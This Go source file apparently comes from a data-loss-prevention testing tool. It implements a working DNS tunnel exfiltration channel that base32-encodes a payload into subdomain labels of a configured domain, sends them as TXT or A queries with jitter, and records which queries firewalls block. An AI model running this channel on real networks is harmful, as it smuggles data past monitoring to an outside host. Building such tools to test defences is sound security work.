// Package dns implements a DNS tunnel exfiltration channel.
// Payload bytes are base32-encoded and split into subdomain labels
// of the configured exfil domain, then sent as DNS queries.
package dns

import (
	"context"
	"encoding/base32"
	"fmt"
	mrand "math/rand/v2"
	"net"
	"strings"
	"time"

	"github.com/hssn-research/dlpbuster/internal/channels"
)

const maxLabelLen = 63  // RFC 1035 label length limit
const maxQueryLen = 200 // conservative total DNS name length

// Channel implements channels.Channel for DNS tunnel exfiltration.
type Channel struct{}

// New returns a new DNS Channel.
func New() *Channel { return &Channel{} }

// Name returns the channel identifier.
func (c *Channel) Name() string { return "dns" }

// Description returns a one-line description.
func (c *Channel) Description() string {
	return "Exfiltrate payload via base32-encoded DNS subdomain queries (A/TXT)"
}

// Run executes the DNS tunnel exfil.
func (c *Channel) Run(ctx context.Context, cfg channels.ChannelConfig) channels.Result {
	result := channels.Result{Channel: c.Name()}
	start := time.Now()

	if cfg.DNSDomain == "" {
		result.Status = channels.StatusSkipped
		result.Evidence = []string{"dns: no domain configured (set channels.dns.domain in config)"}
		result.Duration = time.Since(start)
		return result
	}

	resolver := cfg.DNSResolver
	if resolver == "" {
		resolver = "8.8.8.8:53"
	}

	recordTypes := cfg.DNSRecordTypes
	if len(recordTypes) == 0 {
		recordTypes = []string{"TXT"}
	}

	encoded := base32.StdEncoding.EncodeToString(cfg.Payload)
	encoded = strings.TrimRight(encoded, "=")
	encoded = strings.ToLower(encoded)

	chunks := chunkLabel(encoded, maxLabelLen)

	dialer := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{Timeout: 5 * time.Second}
			return d.DialContext(ctx, "udp", resolver)
		},
	}

	sent := 0
	blocked := 0
	total := len(chunks)
	var evidence []string

	for i, chunk := range chunks {
		select {
		case <-ctx.Done():
			result.Status = channels.StatusPartial
			result.Evidence = append(evidence, fmt.Sprintf("context cancelled after %d/%d chunks", sent, total))
			result.Duration = time.Since(start)
			result.BytesSent = sent * maxLabelLen
			return result
		default:
		}

		fqdn := fmt.Sprintf("%s.%s", chunk, cfg.DNSDomain)

		var lookupErr error
		for _, rt := range recordTypes {
			switch strings.ToUpper(rt) {
			case "TXT":
				_, lookupErr = dialer.LookupTXT(ctx, fqdn)
			default:
				_, lookupErr = dialer.LookupHost(ctx, fqdn)
			}
		}

		if lookupErr != nil {
			// Distinguish NXDOMAIN (query reached DNS, domain simply not found) from
			// SERVFAIL / timeout (query may have been blocked by DLP/firewall).
			errStr := lookupErr.Error()
			isNXDomain := strings.Contains(errStr, "no such host") ||
				strings.Contains(errStr, "NXDOMAIN")
			if isNXDomain {
				evidence = append(evidence, fmt.Sprintf("chunk %d/%d queried: %s → NXDOMAIN (reached DNS)", i+1, total, fqdn))
				sent++
			} else {
				evidence = append(evidence, fmt.Sprintf("chunk %d/%d BLOCKED: %s — %v", i+1, total, fqdn, lookupErr))
				blocked++
			}
		} else {
			evidence = append(evidence, fmt.Sprintf("chunk %d/%d queried: %s → resolved", i+1, total, fqdn))
			sent++
		}

		if cfg.JitterMs > 0 {
			jitter := time.Duration(mrand.IntN(cfg.JitterMs)) * time.Millisecond
			select {
			case <-ctx.Done():
			case <-time.After(jitter):
			}
		}
	}

	switch {
	case blocked == total:
		result.Status = channels.StatusBlocked
		result.Evidence = append(evidence, fmt.Sprintf("all %d DNS queries blocked/filtered via %s", total, resolver))
	case blocked > 0:
		result.Status = channels.StatusPartial
		result.Evidence = append(evidence, fmt.Sprintf("%d/%d queries blocked, %d reached DNS via %s", blocked, total, sent, resolver))
	default:
		result.Status = channels.StatusPassed
		result.BytesSent = len(cfg.Payload)
		result.Evidence = append(evidence, fmt.Sprintf("%d/%d DNS queries passed NXDOMAIN via %s", sent, total, resolver))
	}
	result.Duration = time.Since(start)
	return result
}

// chunkLabel splits s into pieces of at most n bytes.
func chunkLabel(s string, n int) []string {
	var chunks []string
	for len(s) > 0 {
		end := n
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[:end])
		s = s[end:]
	}
	return chunks
}
